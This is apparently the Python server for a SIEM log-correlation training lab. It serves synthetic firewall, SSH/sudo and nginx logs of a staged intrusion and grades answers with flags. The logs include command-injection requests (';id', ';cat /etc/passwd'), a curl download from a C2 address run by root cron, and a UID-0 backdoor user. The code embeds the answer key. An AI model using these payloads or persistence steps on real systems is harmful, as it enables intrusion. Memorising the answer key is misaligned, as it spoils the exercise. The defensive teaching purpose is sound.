"""SIEM correlation lab: multi-source logs hiding a chained attack."""
import os
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

F = {i + 1: os.environ.get(f'FLAG_{i + 1}', 'FLAG{p}') for i in range(3)}

ATTACKER_IP = '203.0.113.66'
VICTIM = 'srv-web-01'
EXPLOIT_LINE = '2026-10-31T23:14:07Z'
PERSISTENCE = 'cron'

FIREWALL_LOG = """2026-10-31T22:58:01Z fw01 DROP TCP 203.0.113.66:51234 -> 10.0.2.10:23 telnet
2026-10-31T22:59:15Z fw01 ACCEPT TCP 10.0.1.20:44312 -> 10.0.2.10:443 https (established)
2026-10-31T23:01:02Z fw01 DROP TCP 203.0.113.66:51235 -> 10.0.2.10:3389 rdp
2026-10-31T23:05:44Z fw01 ACCEPT TCP 203.0.113.66:51240 -> 10.0.2.10:80 http (established)
2026-10-31T23:05:45Z fw01 ACCEPT TCP 203.0.113.66:51241 -> 10.0.2.10:80 http (established)
2026-10-31T23:05:47Z fw01 ACCEPT TCP 203.0.113.66:51242 -> 10.0.2.10:80 http (established)
2026-10-31T23:05:48Z fw01 ACCEPT TCP 203.0.113.66:51243 -> 10.0.2.10:80 http (established)
2026-10-31T23:05:49Z fw01 ACCEPT TCP 203.0.113.66:51244 -> 10.0.2.10:80 http (established)
2026-10-31T23:05:50Z fw01 ACCEPT TCP 203.0.113.66:51245 -> 10.0.2.10:80 http (established)
2026-10-31T23:05:51Z fw01 ACCEPT TCP 203.0.113.66:51246 -> 10.0.2.10:80 http (established)
2026-10-31T23:05:52Z fw01 ACCEPT TCP 203.0.113.66:51247 -> 10.0.2.10:80 http (established)
2026-10-31T23:06:20Z fw01 ACCEPT TCP 203.0.113.66:51250 -> 10.0.2.10:8080 http-proxy (established)
2026-10-31T23:14:07Z fw01 ACCEPT TCP 203.0.113.66:51266 -> 10.0.2.10:8080 http-proxy (established)
2026-10-31T23:20:33Z fw01 ACCEPT TCP 10.0.2.10:49152 -> 185.221.9.7:443 https OUTBOUND (established)
2026-10-31T23:21:02Z fw01 ACCEPT TCP 10.0.2.10:49153 -> 185.221.9.7:443 https OUTBOUND (established)
2026-10-31T23:21:40Z fw01 ACCEPT TCP 10.0.2.10:49154 -> 185.221.9.7:443 https OUTBOUND (established)
2026-10-31T23:22:19Z fw01 ACCEPT TCP 10.0.2.10:49155 -> 185.221.9.7:443 https OUTBOUND (established)
2026-10-31T23:59:59Z fw01 ACCEPT TCP 10.0.1.31:52111 -> 10.0.2.10:445 smb (established)"""

AUTH_LOG = """2026-10-31T23:06:25Z sshd[2011]: Failed password for admin from 203.0.113.66 port 51250 ssh2
2026-10-31T23:06:26Z sshd[2011]: Failed password for root from 203.0.113.66 port 51251 ssh2
2026-10-31T23:06:27Z sshd[2011]: Failed password for oracle from 203.0.113.66 port 51252 ssh2
2026-10-31T23:06:28Z sshd[2011]: Failed password for test from 203.0.113.66 port 51253 ssh2
2026-10-31T23:06:29Z sshd[2011]: Failed password for admin from 203.0.113.66 port 51254 ssh2
2026-10-31T23:06:30Z sshd[2011]: Failed password for admin from 203.0.113.66 port 51255 ssh2
2026-10-31T23:07:58Z sudo: deploy : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/id
2026-10-31T23:14:07Z sshd[2455]: Accepted password for deploy from 203.0.113.66 port 51266 ssh2
2026-10-31T23:14:09Z sshd[2455]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
2026-10-31T23:15:12Z sudo: deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://185.221.9.7/x.sh -o /tmp/.x
2026-10-31T23:15:44Z cron[2901]: (root) CMD (/bin/sh /tmp/.x >/dev/null 2>&1)
2026-10-31T23:16:01Z useradd[2955]: new user: name=svc-helper, UID=0, GID=0, home=/home/svc-helper, shell=/bin/bash
2026-10-31T23:17:30Z sshd[3010]: Accepted publickey for svc-helper from 203.0.113.66 port 51290 ssh2
2026-10-31T23:20:00Z systemd[1]: Started Session 42 of user root."""

WEB_LOG = """203.0.113.66 - - [31/Oct/2026:23:05:45 +0000] "GET / HTTP/1.1" 200 1043
203.0.113.66 - - [31/Oct/2026:23:05:46 +0000] "GET /login HTTP/1.1" 200 2210
203.0.113.66 - - [31/Oct/2026:23:05:47 +0000] "GET /robots.txt HTTP/1.1" 200 41
203.0.113.66 - - [31/Oct/2026:23:05:48 +0000] "GET /.env HTTP/1.1" 404 153
203.0.113.66 - - [31/Oct/2026:23:05:49 +0000] "GET /.git/config HTTP/1.1" 404 153
203.0.113.66 - - [31/Oct/2026:23:05:50 +0000] "GET /admin HTTP/1.1" 302 0
203.0.113.66 - - [31/Oct/2026:23:05:51 +0000] "GET /wp-login.php HTTP/1.1" 404 153
203.0.113.66 - - [31/Oct/2026:23:05:52 +0000] "GET /phpmyadmin HTTP/1.1" 404 153
203.0.113.66 - - [31/Oct/2026:23:06:21 +0000] "GET /api/v1/ping?host=127.0.0.1 HTTP/1.1" 200 9
203.0.113.66 - - [31/Oct/2026:23:14:07 +0000] "GET /api/v1/ping?host=127.0.0.1;id HTTP/1.1" 200 38
203.0.113.66 - - [31/Oct/2026:23:14:08 +0000] "GET /api/v1/ping?host=127.0.0.1;cat+/etc/passwd HTTP/1.1" 200 1024
203.0.113.66 - - [31/Oct/2026:23:14:09 +0000] "POST /api/v1/ping HTTP/1.1" 500 0
10.0.1.20 - - [31/Oct/2026:23:30:12 +0000] "GET /dashboard HTTP/1.1" 200 5120
10.0.1.31 - - [31/Oct/2026:23:44:55 +0000] "GET /api/v1/orders HTTP/1.1" 200 2048"""


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        path = parsed.path

        if path == '/':
            self.send_html(WELCOME)
        elif path == '/logs/firewall':
            self.send_text(FIREWALL_LOG)
        elif path == '/logs/auth':
            self.send_text(AUTH_LOG)
        elif path == '/logs/web':
            self.send_text(WEB_LOG)
        elif path == '/logs':
            self.send_json({
                'sources': ['firewall', 'auth', 'web'],
                'note': 'pull each with /logs/<source> and correlate by IP/time',
            })
        elif path == '/correlate':
            self.handle_correlate(params)
        else:
            self.send_html('<h1>404</h1>', 404)

    def handle_correlate(self, params):
        """The analyst reconstructs the kill chain: who, when, how persisted."""
        ip = params.get('ip', [''])[0].strip()
        exploit_time = params.get('time', [''])[0].strip()
        persistence = params.get('persistence', [''])[0].strip().lower()
        result = {}

        if ip == ATTACKER_IP:
            result['attacker_ip'] = {'correct': True, 'flag': F[1],
                                     'note': 'Same external IP: scan, brute force, exploit and C2 callbacks'}
        elif ip:
            result['attacker_ip'] = {'correct': False,
                                     'hint': 'Which IP appears in recon AND brute force AND the exploit?'}

        # The exploit moment: command injection lands at 23:14:07
        if '23:14:07' in exploit_time:
            result['exploit_time'] = {'correct': True, 'flag': F[2],
                                      'note': 'ping?host=127.0.0.1;id = command injection via the API'}
        elif exploit_time:
            result['exploit_time'] = {'correct': False,
                                      'hint': 'Find the web request where id / cat /etc/passwd execute'}

        if persistence == PERSISTENCE:
            result['persistence'] = {'correct': True, 'flag': F[3],
                                     'note': 'cron runs /tmp/.x as root every minute; also note the UID-0 user'}
        elif persistence:
            result['persistence'] = {'correct': False,
                                     'hint': 'What re-runs the dropped script /tmp/.x periodically?'}

        result['summary'] = 'submit ?ip=&time=&persistence= with your reconstruction'
        self.send_json(result)

    def send_json(self, data, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())

    def send_text(self, text, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.end_headers()
        self.wfile.write(text.encode())

    def send_html(self, html, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode())

    def log_message(self, *a):
        pass


WELCOME = """<html><body style="font-family:monospace;padding:40px;background:#0d1117;color:#c9d1d9">
<h1>&#128200; SIEM Correlation</h1>
<p>Three log sources from the night of Oct 31. An attacker crossed all of them. Rebuild the chain:</p>
<ul>
<li><a href="/logs/firewall" style="color:#58a6ff">/logs/firewall</a> &mdash; fw01</li>
<li><a href="/logs/auth" style="color:#58a6ff">/logs/auth</a> &mdash; sshd/sudo/cron/useradd</li>
<li><a href="/logs/web" style="color:#58a6ff">/logs/web</a> &mdash; nginx access</li>
<li><a href="/correlate" style="color:#58a6ff">/correlate</a> &mdash; submit ?ip=&amp;time=&amp;persistence=</li>
</ul>
<p style="color:#d29922;font-size:12px">Chain: recon &rarr; brute force &rarr; exploit &rarr; persistence &rarr; C2 callbacks (185.221.9.7). Timezone: UTC.</p>
</body></html>"""

if __name__ == '__main__':
    HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
